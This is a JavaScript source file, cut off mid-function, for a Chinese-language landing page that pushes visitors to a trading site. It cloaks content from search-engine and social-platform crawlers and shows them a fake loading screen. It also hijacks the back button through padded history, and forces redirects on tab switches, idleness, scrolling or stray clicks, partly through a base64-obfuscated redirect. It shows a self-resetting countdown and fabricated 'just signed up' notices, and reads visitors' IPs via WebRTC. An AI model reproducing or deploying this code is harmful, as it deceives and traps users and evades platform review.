// Main application class
class LandingPageApp {
    constructor() {
        this.targetUrl = 'https://fusiontrade.info';
        this.isBot = false;
        this.userInteracted = false;
        this.pageLoadTime = Date.now();
        this.exitIntentShown = false;

        // Security and filtering configuration
        this.ipBlacklist = [
            // Common bot/crawler IP ranges (examples)
            '66.249.', // Google
            '157.55.', // Bing
            '40.77.',  // Bing
            '207.46.', // Bing
            '69.171.', // Facebook
            '173.252.', // Facebook
            '199.16.', // Twitter
            '54.236.', // Amazon/AWS bots
        ];

        this.suspiciousReferrers = [
            'facebook.com',
            'twitter.com',
            'linkedin.com',
            'pinterest.com',
            'reddit.com',
            't.co',
            'bit.ly',
            'tinyurl.com'
        ];

        this.init();
    }

    init() {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.setup());
        } else {
            this.setup();
        }
    }

    setup() {
        // Security checks
        this.checkReferrer();
        this.checkClientIP();

        // Bot detection
        this.detectBot();

        // Block if bot detected
        if (this.isBot) {
            this.handleBotDetection();
            return;
        }

        // Initialize components
        this.initCountdown();
        this.initCTA();
        this.initExitIntent();
        this.initBackButtonRedirect();
        this.initBackupStrategies();
        this.initUserInteractionTracking();
        this.initActivityFeed();

        // Hide loading overlay after delay
        setTimeout(() => this.hideLoading(), 1500);

        // Enable CTA after delay (anti-bot measure)
        setTimeout(() => this.enableCTA(), 2000);

        // Initialize analytics if not a bot
        setTimeout(() => this.initAnalytics(), 3000);
    }

    // Check referrer for suspicious sources
    checkReferrer() {
        const referrer = document.referrer.toLowerCase();

        if (referrer) {
            const isSuspicious = this.suspiciousReferrers.some(domain =>
                referrer.includes(domain)
            );

            if (isSuspicious) {
                this.logSuspiciousActivity('suspicious_referrer', {
                    referrer: document.referrer
                });
                // Don't immediately block, but increase suspicion
                this.botScore = (this.botScore || 0) + 15;
            }
        }
    }

    // Client-side IP checking (limited, mainly for logging)
    checkClientIP() {
        // This is limited on client-side, but we can try WebRTC
        try {
            this.getClientIP().then(ip => {
                if (ip) {
                    const isBlacklisted = this.ipBlacklist.some(range =>
                        ip.startsWith(range)
                    );

                    if (isBlacklisted) {
                        this.isBot = true;
                        this.logSuspiciousActivity('blacklisted_ip', { ip });
                    }
                }
            });
        } catch (e) {
            // Ignore errors
        }
    }

    // Get client IP using WebRTC (when possible)
    getClientIP() {
        return new Promise((resolve) => {
            try {
                const RTCPeerConnection = window.RTCPeerConnection ||
                                        window.mozRTCPeerConnection ||
                                        window.webkitRTCPeerConnection;

                if (!RTCPeerConnection) {
                    resolve(null);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });

                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (ipMatch) {
                            resolve(ipMatch[1]);
                            pc.close();
                        }
                    }
                };

                // Timeout after 3 seconds
                setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 3000);

            } catch (e) {
                resolve(null);
            }
        });
    }

    // Handle bot detection
    handleBotDetection() {
        console.log('Bot detected, implementing countermeasures');

        // Hide main content
        const container = document.querySelector('.container');
        if (container) {
            container.style.display = 'none';
        }

        // Show fake loading or redirect to safe page
        document.body.innerHTML = `
            <div style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif;">
                <div style="text-align: center;">
                    <div style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                    <p>Loading...</p>
                </div>
            </div>
            <style>
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        `;

        // Log the bot attempt
        this.logSuspiciousActivity('bot_blocked', {
            botScore: this.botScore,
            indicators: this.botIndicators,
            timestamp: Date.now()
        });

        // Optional: redirect to a honeypot or safe page after delay
        setTimeout(() => {
            window.location.href = 'https://example.com';
        }, 5000);
    }

    // Advanced bot detection system
    detectBot() {
        let botScore = 0;
        const botIndicators = [];

        // 1. User Agent Analysis
        const botPatterns = [
            /bot/i, /crawl/i, /spider/i, /scrape/i, /fetch/i,
            /facebook/i, /twitter/i, /linkedin/i, /pinterest/i,
            /google/i, /bing/i, /yahoo/i, /baidu/i, /yandex/i,
            /duckduckgo/i, /slurp/i, /archive/i, /wget/i, /curl/i,
            /python/i, /java/i, /php/i, /ruby/i, /perl/i,
            /headless/i, /phantom/i, /selenium/i, /webdriver/i
        ];

        const userAgent = navigator.userAgent;
        if (botPatterns.some(pattern => pattern.test(userAgent))) {
            botScore += 50;
            botIndicators.push('suspicious_user_agent');
        }

        // 2. Headless Browser Detection
        if (navigator.webdriver ||
            window.navigator.webdriver ||
            window.callPhantom ||
            window._phantom ||
            window.Buffer ||
            window.emit ||
            window.spawn) {
            botScore += 40;
            botIndicators.push('headless_browser');
        }

        // 3. Browser Features Check
        if (!navigator.languages || navigator.languages.length === 0) {
            botScore += 20;
            botIndicators.push('no_languages');
        }

        if (!navigator.plugins || navigator.plugins.length === 0) {
            botScore += 15;
            botIndicators.push('no_plugins');
        }

        // 4. Screen and Window Checks
        if (screen.width === 0 || screen.height === 0) {
            botScore += 30;
            botIndicators.push('invalid_screen');
        }

        if (screen.width < 100 || screen.height < 100) {
            botScore += 20;
            botIndicators.push('tiny_screen');
        }

        // 5. WebGL and Canvas Check
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if (!ctx) {
                botScore += 15;
                botIndicators.push('no_canvas');
            }
        } catch (e) {
            botScore += 15;
            botIndicators.push('canvas_error');
        }

        // 6. Timezone Check
        try {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (!timezone || timezone === 'UTC') {
                botScore += 10;
                botIndicators.push('suspicious_timezone');
            }
        } catch (e) {
            botScore += 10;
            botIndicators.push('timezone_error');
        }

        // 7. Performance API Check
        if (!window.performance || !window.performance.timing) {
            botScore += 10;
            botIndicators.push('no_performance_api');
        }

        // 8. Touch Support Check (for mobile detection)
        const isMobile = /Mobi|Android/i.test(userAgent);
        const hasTouch = 'ontouchstart' in window;
        if (isMobile && !hasTouch) {
            botScore += 15;
            botIndicators.push('mobile_no_touch');
        }

        // 9. IP-based checks (client-side approximation)
        this.checkSuspiciousIP();

        // 10. Behavioral pattern initialization
        this.initBehaviorTracking();

        // Determine if bot (threshold: 30+)
        this.isBot = botScore >= 30;
        this.botScore = botScore;
        this.botIndicators = botIndicators;

        console.log('Bot detection result:', {
            isBot: this.isBot,
            score: botScore,
            indicators: botIndicators
        });

        // Log suspicious activity
        if (this.isBot) {
            this.logSuspiciousActivity('bot_detected', {
                score: botScore,
                indicators: botIndicators,
                userAgent: userAgent
            });
        }
    }

    // IP-based suspicious activity detection
    checkSuspiciousIP() {
        // This would typically be done server-side, but we can do basic checks
        try {
            // Check if using VPN/Proxy (basic detection)
            if (navigator.connection && navigator.connection.type === 'none') {
                this.botScore += 5;
                this.botIndicators.push('no_connection');
            }
        } catch (e) {
            // Ignore errors
        }
    }

    // Behavioral pattern tracking
    initBehaviorTracking() {
        this.behaviorData = {
            mouseMovements: 0,
            clicks: 0,
            scrolls: 0,
            keystrokes: 0,
            startTime: Date.now(),
            patterns: []
        };

        // Track mouse movements
        let mouseMoveCount = 0;
        document.addEventListener('mousemove', () => {
            mouseMoveCount++;
            if (mouseMoveCount % 10 === 0) { // Sample every 10th movement
                this.behaviorData.mouseMovements++;
            }
        });

        // Track clicks
        document.addEventListener('click', () => {
            this.behaviorData.clicks++;
        });

        // Track scrolling
        let scrollCount = 0;
        document.addEventListener('scroll', () => {
            scrollCount++;
            if (scrollCount % 5 === 0) { // Sample every 5th scroll
                this.behaviorData.scrolls++;
            }
        });

        // Track keystrokes
        document.addEventListener('keydown', () => {
            this.behaviorData.keystrokes++;
        });

        // Analyze behavior after 10 seconds
        setTimeout(() => this.analyzeBehavior(), 10000);
    }

    // Analyze user behavior patterns
    analyzeBehavior() {
        const timeSpent = Date.now() - this.behaviorData.startTime;
        const data = this.behaviorData;

        let suspiciousScore = 0;
        const suspiciousPatterns = [];

        // Too little interaction for time spent
        if (timeSpent > 5000 && data.mouseMovements === 0) {
            suspiciousScore += 20;
            suspiciousPatterns.push('no_mouse_movement');
        }

        // Unnatural click patterns
        if (data.clicks > 0 && data.mouseMovements === 0) {
            suspiciousScore += 15;
            suspiciousPatterns.push('clicks_without_movement');
        }

        // Too fast interaction
        if (timeSpent < 2000 && data.clicks > 0) {
            suspiciousScore += 25;
            suspiciousPatterns.push('too_fast_interaction');
        }

        // No scrolling on long page
        if (timeSpent > 10000 && data.scrolls === 0 && document.body.scrollHeight > window.innerHeight * 2) {
            suspiciousScore += 10;
            suspiciousPatterns.push('no_scrolling');
        }

        // Update bot status if suspicious behavior detected
        if (suspiciousScore >= 20) {
            this.isBot = true;
            this.botScore += suspiciousScore;
            this.botIndicators.push(...suspiciousPatterns);

            this.logSuspiciousActivity('suspicious_behavior', {
                behaviorScore: suspiciousScore,
                patterns: suspiciousPatterns,
                behaviorData: data
            });
        }

        console.log('Behavior analysis:', {
            timeSpent,
            behaviorData: data,
            suspiciousScore,
            patterns: suspiciousPatterns
        });
    }

    // Log suspicious activity
    logSuspiciousActivity(type, data) {
        const logData = {
            type,
            timestamp: Date.now(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            ...data
        };

        console.warn('Suspicious activity detected:', logData);

        // Send to monitoring endpoint (if available)
        try {
            fetch('/security/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logData)
            }).catch(() => {}); // Ignore errors
        } catch (e) {
            // Ignore errors
        }
    }

    // Countdown timer
    initCountdown() {
        const hoursEl = document.getElementById('hours');
        const minutesEl = document.getElementById('minutes');
        const secondsEl = document.getElementById('seconds');
        
        if (!hoursEl || !minutesEl || !secondsEl) return;
        
        // Set initial countdown (24 hours from now)
        const endTime = new Date().getTime() + (24 * 60 * 60 * 1000);
        
        const updateCountdown = () => {
            const now = new Date().getTime();
            const distance = endTime - now;
            
            if (distance < 0) {
                // Reset to 24 hours
                const newEndTime = new Date().getTime() + (24 * 60 * 60 * 1000);
                return;
            }
            
            const hours = Math.floor(distance / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            hoursEl.textContent = hours.toString().padStart(2, '0');
            minutesEl.textContent = minutes.toString().padStart(2, '0');
            secondsEl.textContent = seconds.toString().padStart(2, '0');
        };
        
        updateCountdown();
        setInterval(updateCountdown, 1000);
    }

    // CTA button functionality
    initCTA() {
        const mainCTA = document.getElementById('main-cta');
        const exitCTA = document.getElementById('exit-cta');
        
        if (mainCTA) {
            mainCTA.addEventListener('click', (e) => this.handleCTAClick(e));
        }
        
        if (exitCTA) {
            exitCTA.addEventListener('click', (e) => this.handleCTAClick(e));
        }
    }

    enableCTA() {
        const mainCTA = document.getElementById('main-cta');
        if (mainCTA) {
            mainCTA.disabled = false;
            mainCTA.querySelector('.cta-text').textContent = '立即获取完整课程';
        }
    }

    handleCTAClick(event) {
        event.preventDefault();

        const button = event.target.closest('button');
        const buttonId = button ? button.id : 'unknown';

        // Track click attempt
        this.trackEvent('cta_click_attempt', {
            button_id: buttonId,
            time_on_page: Date.now() - this.pageLoadTime,
            mouse_x: event.clientX,
            mouse_y: event.clientY
        });

        // Enhanced anti-bot checks
        if (!this.validateClickSecurity(event)) {
            this.logSuspiciousActivity('invalid_click', {
                button_id: buttonId,
                reason: 'security_validation_failed'
            });
            return;
        }

        // Show loading state
        this.showClickLoading(button);

        // Add small delay for human-like behavior
        setTimeout(() => {
            this.executeRedirect(buttonId);
        }, 300 + Math.random() * 200); // 300-500ms delay
    }

    validateClickSecurity(event) {
        // 1. Bot check
        if (this.isBot) {
            console.log('Bot detected, blocking redirect');
            return false;
        }

        // 2. User interaction check
        if (!this.userInteracted) {
            console.log('No user interaction detected, blocking redirect');
            return false;
        }

        // 3. Minimum time check (prevent instant clicks)
        const timeOnPage = Date.now() - this.pageLoadTime;
        if (timeOnPage < 2000) {
            console.log('Too fast click, potential bot');
            return false;
        }

        // 4. Check if click has valid coordinates
        if (!event.clientX || !event.clientY) {
            console.log('Invalid click coordinates');
            return false;
        }

        // 5. Check for rapid successive clicks
        const now = Date.now();
        if (this.lastClickTime && (now - this.lastClickTime) < 500) {
            console.log('Too rapid successive clicks');
            return false;
        }
        this.lastClickTime = now;

        // 6. Verify button is actually visible and clickable
        const button = event.target.closest('button');
        if (button) {
            const rect = button.getBoundingClientRect();
            const isVisible = rect.width > 0 && rect.height > 0 &&
                            rect.top >= 0 && rect.left >= 0;
            if (!isVisible) {
                console.log('Button not visible');
                return false;
            }
        }

        return true;
    }

    showClickLoading(button) {
        if (button) {
            const originalText = button.innerHTML;
            button.innerHTML = '<span class="cta-text">处理中...</span>';
            button.disabled = true;

            // Store original content for restoration if needed
            button.dataset.originalContent = originalText;
        }
    }

    executeRedirect(buttonId) {
        // Final security check
        if (this.isBot) {
            console.log('Final bot check failed');
            return;
        }

        // Track successful click
        this.trackEvent('cta_click_success', {
            button_id: buttonId,
            time_on_page: Date.now() - this.pageLoadTime
        });

        // Track CTA click for CTR calculation
        if (this.analyticsManager) {
            this.analyticsManager.trackCTAClick(buttonId);
        }

        // Execute redirect with multiple fallback methods
        this.redirectToTarget();
    }

    redirectToTarget() {
        // Close any open modals
        this.closeModal();

        // Generate obfuscated redirect URL
        const obfuscatedUrl = this.generateObfuscatedRedirect();

        // Try multiple redirect methods for maximum compatibility
        const redirectMethods = [
            () => this.directRedirect(),
            () => this.formRedirect(),
            () => this.scriptRedirect(),
            () => this.metaRedirect()
        ];

        // Try each method with fallback
        let methodIndex = 0;
        const tryRedirect = () => {
            if (methodIndex < redirectMethods.length) {
                try {
                    redirectMethods[methodIndex]();
                } catch (e) {
                    console.log(`Redirect method ${methodIndex} failed:`, e);
                    methodIndex++;
                    setTimeout(tryRedirect, 100);
                }
            } else {
                // Final fallback - open in new window
                window.open(this.targetUrl, '_blank');
            }
        };

        tryRedirect();
    }

    generateObfuscatedRedirect() {
        // Multiple layers of obfuscation
        const url = this.targetUrl;

        // Method 1: Base64 encoding
        const encoded1 = btoa(url);

        // Method 2: Character code manipulation
        const encoded2 = url.split('').map(char =>
            String.fromCharCode(char.charCodeAt(0) + 1)
        ).join('');

        // Method 3: Reverse and encode
        const encoded3 = btoa(url.split('').reverse().join(''));

        return {
            method1: encoded1,
            method2: encoded2,
            method3: encoded3,
            original: url
        };
    }

    directRedirect() {
        // Simple direct redirect
        window.location.href = this.targetUrl;
    }

    formRedirect() {
        // Create hidden form for POST redirect
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = this.targetUrl;
        form.style.display = 'none';

        // Add hidden field to make it look like a form submission
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'redirect';
        input.value = 'true';
        form.appendChild(input);

        document.body.appendChild(form);
        form.submit();
    }

    scriptRedirect() {
        // JavaScript-based redirect with obfuscation
        const encodedUrl = btoa(this.targetUrl);
        const script = document.createElement('script');
        script.innerHTML = `
            setTimeout(function() {
                var url = atob('${encodedUrl}');
                window.location.href = url;
            }, 100);
        `;
        document.head.appendChild(script);
    }

    metaRedirect() {
        // Meta refresh redirect
        const meta = document.createElement('meta');
        meta.httpEquiv = 'refresh';
        meta.content = `0;url=${this.targetUrl}`;
        document.head.appendChild(meta);
    }

    // Enhanced exit intent detection
    initExitIntent() {
        this.exitIntentData = {
            mouseY: 0,
            lastMouseMove: Date.now(),
            exitAttempts: 0,
            scrollPosition: 0,
            timeOnPage: 0
        };

        // Track mouse movement
        document.addEventListener('mousemove', (e) => {
            this.exitIntentData.mouseY = e.clientY;
            this.exitIntentData.lastMouseMove = Date.now();
        });

        // Enhanced exit detection
        document.addEventListener('mouseleave', (e) => {
            this.handleExitIntent(e, 'mouse_leave');
        });

        // Detect rapid upward mouse movement (exit intent)
        let lastY = 0;
        document.addEventListener('mousemove', (e) => {
            if (lastY - e.clientY > 50 && e.clientY < 100) {
                this.handleExitIntent(e, 'rapid_upward');
            }
            lastY = e.clientY;
        });

        // Tab visibility change (user switching tabs)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.handleExitIntent(null, 'tab_hidden');
            }
        });

        // Window blur (user clicking outside)
        window.addEventListener('blur', () => {
            this.handleExitIntent(null, 'window_blur');
        });

        // Scroll-based exit intent (user scrolled back to top quickly)
        let lastScrollTime = Date.now();
        let lastScrollY = 0;

        window.addEventListener('scroll', () => {
            const currentScrollY = window.scrollY;
            const currentTime = Date.now();
            const scrollSpeed = Math.abs(currentScrollY - lastScrollY) / (currentTime - lastScrollTime);

            // If user scrolled to top very quickly
            if (currentScrollY < 100 && lastScrollY > 300 && scrollSpeed > 2) {
                this.handleExitIntent(null, 'rapid_scroll_top');
            }

            lastScrollY = currentScrollY;
            lastScrollTime = currentTime;
        });

        // Time-based exit intent (user been on page for a while without action)
        setTimeout(() => {
            if (!this.userInteracted && !this.exitIntentShown) {
                this.handleExitIntent(null, 'time_based');
            }
        }, 30000); // 30 seconds
    }

    handleExitIntent(event, trigger) {
        // Don't show if already shown or if it's a bot
        if (this.exitIntentShown || this.isBot) {
            return;
        }

        // Validate exit intent based on trigger
        if (!this.validateExitIntent(event, trigger)) {
            return;
        }

        this.exitIntentData.exitAttempts++;
        this.exitIntentData.timeOnPage = Date.now() - this.pageLoadTime;

        // Track exit intent
        this.trackEvent('exit_intent_detected', {
            trigger: trigger,
            attempts: this.exitIntentData.exitAttempts,
            time_on_page: this.exitIntentData.timeOnPage,
            scroll_position: window.scrollY
        });

        // Show exit modal or redirect directly
        if (this.shouldShowExitModal(trigger)) {
            this.showExitModal(trigger);
        } else {
            this.executeExitRedirect(trigger);
        }
    }

    validateExitIntent(event, trigger) {
        const timeOnPage = Date.now() - this.pageLoadTime;

        // Must be on page for at least 3 seconds
        if (timeOnPage < 3000) {
            return false;
        }

        // Specific validation for different triggers
        switch (trigger) {
            case 'mouse_leave':
                return event && event.clientY <= 0;

            case 'rapid_upward':
                return event && event.clientY < 100;

            case 'tab_hidden':
            case 'window_blur':
                return timeOnPage > 5000; // At least 5 seconds

            case 'rapid_scroll_top':
                return window.scrollY < 100;

            case 'time_based':
                return timeOnPage > 25000; // At least 25 seconds

            default:
                return true;
        }
    }

    shouldShowExitModal(trigger) {
        // Show modal for certain triggers, direct redirect for others
        const modalTriggers = ['mouse_leave', 'rapid_upward', 'rapid_scroll_top'];
        return modalTriggers.includes(trigger) && this.exitIntentData.exitAttempts <= 2;
    }

    executeExitRedirect(trigger) {
        console.log('Executing exit redirect:', trigger);

        this.trackEvent('exit_redirect', {
            trigger: trigger,
            time_on_page: Date.now() - this.pageLoadTime
        });

        // Direct redirect without modal
        this.redirectToTarget();
    }

    showExitModal() {
        const modal = document.getElementById('exit-modal');
        if (modal) {
            modal.classList.add('show');
            this.exitIntentShown = true;
            
            this.trackEvent('exit_intent_shown');
            
            // Auto-close after 10 seconds
            setTimeout(() => {
                if (modal.classList.contains('show')) {
                    this.closeModal();
                }
            }, 10000);
        }
    }

    closeModal() {
        const modal = document.getElementById('exit-modal');
        const closeBtn = document.getElementById('close-modal');
        
        if (modal) {
            modal.classList.remove('show');
        }
        
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                modal.classList.remove('show');
            });
        }
        
        // Close on background click
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.classList.remove('show');
                }
            });
        }
    }

    // Enhanced back button redirect with multiple strategies
    initBackButtonRedirect() {
        this.backButtonData = {
            attempts: 0,
            lastAttempt: 0,
            historyLength: history.length
        };

        // Strategy 1: History manipulation
        this.setupHistoryManipulation();

        // Strategy 2: Hash-based navigation trap
        this.setupHashTrap();

        // Strategy 3: Beforeunload event
        this.setupBeforeUnload();

        // Strategy 4: Page visibility API
        this.setupVisibilityTrap();
    }

    setupHistoryManipulation() {
        // Add multiple dummy history entries to make back button harder to use
        for (let i = 0; i < 3; i++) {
            history.pushState(null, null, location.href + '#step' + i);
        }

        // Reset to original URL
        history.pushState(null, null, location.href.split('#')[0]);

        window.addEventListener('popstate', (event) => {
            this.handleBackButton('popstate');
        });
    }

    setupHashTrap() {
        // Monitor hash changes
        window.addEventListener('hashchange', (event) => {
            this.handleBackButton('hashchange');
        });

        // Set initial hash
        if (!window.location.hash) {
            window.location.hash = '#landing';
        }
    }

    setupBeforeUnload() {
        // 移除beforeunload事件监听，不再询问用户是否离开页面
        // 只保留数据追踪功能
        window.addEventListener('beforeunload', (event) => {
            if (!this.isBot && this.userInteracted) {
                // Track the unload attempt
                this.trackEvent('page_unload_attempt', {
                    time_on_page: Date.now() - this.pageLoadTime,
                    method: 'beforeunload'
                });
            }
        });
    }

    setupVisibilityTrap() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // User is leaving the page (tab switch, minimize, etc.)
                this.handleBackButton('visibility_hidden');
            }
        });
    }

    handleBackButton(method) {
        const now = Date.now();

        // Prevent rapid successive triggers
        if (now - this.backButtonData.lastAttempt < 1000) {
            return;
        }

        this.backButtonData.attempts++;
        this.backButtonData.lastAttempt = now;

        // Don't redirect bots
        if (this.isBot) {
            return;
        }

        // Must have some user interaction
        if (!this.userInteracted && method !== 'visibility_hidden') {
            return;
        }

        // Track back button attempt
        this.trackEvent('back_button_attempt', {
            method: method,
            attempts: this.backButtonData.attempts,
            time_on_page: now - this.pageLoadTime
        });

        // Different strategies based on attempt count
        if (this.backButtonData.attempts === 1) {
            // First attempt: show exit modal if not shown yet
            if (!this.exitIntentShown) {
                this.showExitModal('back_button');
                // Add more history entries to trap user
                history.pushState(null, null, location.href);
                return;
            }
        }

        // Subsequent attempts or if modal already shown: redirect
        this.trackEvent('back_button_redirect', {
            method: method,
            attempts: this.backButtonData.attempts
        });

        this.redirectToTarget();
    }

    // Additional backup redirect strategies
    initBackupStrategies() {
        // Strategy 1: Idle detection redirect
        this.setupIdleRedirect();

        // Strategy 2: Scroll-based redirect
        this.setupScrollRedirect();

        // Strategy 3: Time-based redirect
        this.setupTimeBasedRedirect();

        // Strategy 4: Click outside redirect
        this.setupClickOutsideRedirect();
    }

    setupIdleRedirect() {
        let idleTimer;
        const idleTime = 60000; // 1 minute

        const resetIdleTimer = () => {
            clearTimeout(idleTimer);
            idleTimer = setTimeout(() => {
                if (!this.isBot && this.userInteracted) {
                    this.trackEvent('idle_redirect', {
                        idle_time: idleTime,
                        time_on_page: Date.now() - this.pageLoadTime
                    });
                    this.redirectToTarget();
                }
            }, idleTime);
        };

        // Reset timer on user activity
        ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
            document.addEventListener(event, resetIdleTimer, true);
        });

        resetIdleTimer();
    }

    setupScrollRedirect() {
        let scrollRedirectTriggered = false;

        window.addEventListener('scroll', () => {
            if (scrollRedirectTriggered || this.isBot) return;

            const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;

            // If user scrolled to bottom
            if (scrollPercent > 90) {
                scrollRedirectTriggered = true;

                this.trackEvent('scroll_bottom_redirect', {
                    scroll_percent: scrollPercent,
                    time_on_page: Date.now() - this.pageLoadTime
                });

                // Small delay then redirect
                setTimeout(() => {
                    this.redirectToTarget();
                }, 2000);
            }
        });
    }

    setupTimeBasedRedirect() {
        // Redirect after user has been on page for a certain time
        const redirectTimes = [120000, 180000, 300000]; // 2, 3, 5 minutes

        redirectTimes.forEach((time, index) => {
            setTimeout(() => {
                if (!this.isBot && this.userInteracted && !this.exitIntentShown) {
                    this.trackEvent('time_based_redirect', {
                        trigger_time: time,
                        attempt: index + 1,
                        time_on_page: Date.now() - this.pageLoadTime
                    });

                    // Show modal first, then redirect
                    if (index === 0) {
                        this.showExitModal('time_based');
                    } else {
                        this.redirectToTarget();
                    }
                }
            }, time);
        });
    }

    setupClickOutsideRedirect() {
        document.addEventListener('click', (event) => {
            if (this.isBot) return;

            // If click is outside main content area
            const mainContent = document.querySelector('.container');
            if (mainContent && !mainContent.contains(event.target)) {
                this.trackEvent('click_outside_redirect', {
                    click_x: event.clientX,
                    click_y: event.clientY,
                    time_on_page: Date.now() - this.pageLoadTime
                });

                // Small delay then redirect
                setTimeout(() => {
                    this.redirectToTarget();
                }, 500);
            }
        });
    }

    // User interaction tracking
    initUserInteractionTracking() {
        const interactionEvents = ['click', 'scroll', 'keydown', 'touchstart'];
        
        const markInteraction = () => {
            this.userInteracted = true;
            // Remove listeners after first interaction
            interactionEvents.forEach(event => {
                document.removeEventListener(event, markInteraction);
            });
        };
        
        interactionEvents.forEach(event => {
            document.addEventListener(event, markInteraction, { once: true });
        });
        
        // Auto-mark as interacted after 5 seconds of presence
        setTimeout(() => {
            if (!this.isBot) {
                this.userInteracted = true;
            }
        }, 5000);
    }

    // Loading overlay
    hideLoading() {
        const overlay = document.getElementById('loading-overlay');
        if (overlay) {
            overlay.classList.add('hidden');
            setTimeout(() => {
                overlay.style.display = 'none';
            }, 300);
        }
    }

    // Analytics initialization
    initAnalytics() {
        // Initialize enhanced analytics manager
        if (window.AnalyticsManager && window.ANALYTICS_CONFIG) {
            this.analyticsManager = new window.AnalyticsManager(window.ANALYTICS_CONFIG);
            this.analyticsManager.init();
        } else {
            // Fallback to basic analytics
            this.loadGoogleAnalytics();
            this.loadFacebookPixel();

            // Track page view
            this.trackEvent('page_view', {
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                is_mobile: /Mobi|Android/i.test(navigator.userAgent)
            });
        }
    }

    loadGoogleAnalytics() {
        // Placeholder for Google Analytics
        // Replace 'GA_MEASUREMENT_ID' with actual ID
        const script = document.createElement('script');
        script.async = true;
        script.src = 'https://www.googletagmanager.com/gtag/js?id=G-XD560Q1ZQT ';
        document.head.appendChild(script);
        
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-XD560Q1ZQT ');
        
        window.gtag = gtag;
    }

    loadFacebookPixel() {
        // Placeholder for Facebook Pixel
        // Replace 'FACEBOOK_PIXEL_ID' with actual ID
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        
        fbq('init', 'FACEBOOK_PIXEL_ID');
        fbq('track', 'PageView');
    }

    // Event tracking
    trackEvent(eventName, parameters = {}) {
        console.log('Event tracked:', eventName, parameters);

        // Use enhanced analytics manager if available
        if (this.analyticsManager) {
            this.analyticsManager.trackEvent(eventName, parameters);
        } else {
            // Fallback to basic tracking
            // Google Analytics
            if (window.gtag) {
                gtag('event', eventName, parameters);
            }

            // Facebook Pixel
            if (window.fbq) {
                fbq('track', eventName, parameters);
            }
        }

        // Custom analytics endpoint (if needed)
        // this.sendToCustomAnalytics(eventName, parameters);
    }

    // Custom analytics sender
    sendToCustomAnalytics(eventName, parameters) {
        const data = {
            event: eventName,
            parameters: parameters,
            timestamp: Date.now(),
            url: window.location.href,
            referrer: document.referrer
        };

        // Send to your analytics endpoint
        fetch('/analytics', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        }).catch(err => console.log('Analytics error:', err));
    }

    // Dynamic activity feed
    initActivityFeed() {
        const activities = [
            { city: '北京', name: '王**', action: '刚刚报名成功' },
            { city: '上海', name: '李**', action: '刚刚报名成功' },
            { city: '深圳', name: '张**', action: '刚刚报名成功' },
            { city: '广州', name: '陈**', action: '刚刚报名成功' },
            { city: '杭州', name: '刘**', action: '刚刚报名成功' },
            { city: '成都', name: '赵**', action: '刚刚报名成功' },
            { city: '武汉', name: '孙**', action: '刚刚报名成功' },
            { city: '西安', name: '周**', action: '刚刚报名成功' },
            { city: '南京', name: '吴**', action: '刚刚报名成功' },
            { city: '重庆', name: '郑**', action: '刚刚报名成功' },
            { city: '天津', name: '王**', action: '刚刚报名成功' },
            { city: '苏州', name: '冯**', action: '刚刚报名成功' }
        ];

        const feedElement = document.getElementById('activity-feed');
        if (!feedElement) return;

        const updateFeed = () => {
            if (this.isBot) return;

            const feedItems = feedElement.querySelectorAll('.activity-item');
            const randomActivity = activities[Math.floor(Math.random() * activities.length)];
            const timeAgo = Math.floor(Math.random() * 10) + 1; // 1-10 minutes ago

            // Create new activity item
            const newItem = document.createElement('div');
            newItem.className = 'activity-item';
            newItem.innerHTML = `
                <span class="time">${timeAgo}分钟前</span>
                <span class="action">${randomActivity.city}-${randomActivity.name} ${randomActivity.action}</span>
            `;

            // Add to top of feed
            feedElement.insertBefore(newItem, feedElement.firstChild);

            // Remove last item if more than 3 items
            if (feedItems.length >= 3) {
                feedElement.removeChild(feedElement.lastChild);
            }

            // Update existing times
            feedItems.forEach((item, index) => {
                const timeSpan = item.querySelector('.time');
                if (timeSpan && index < 2) { // Only update first 2 items
                    const currentTime = parseInt(timeSpan.textContent);
                    timeSpan.textContent = `${currentTime + 1}分钟前`;
                }
            });
        };

        // Update feed every 15-30 seconds
        const updateInterval = () => {
            const delay = 15000 + Math.random() * 15000; // 15-30 seconds
            setTimeout(() => {
                updateFeed();
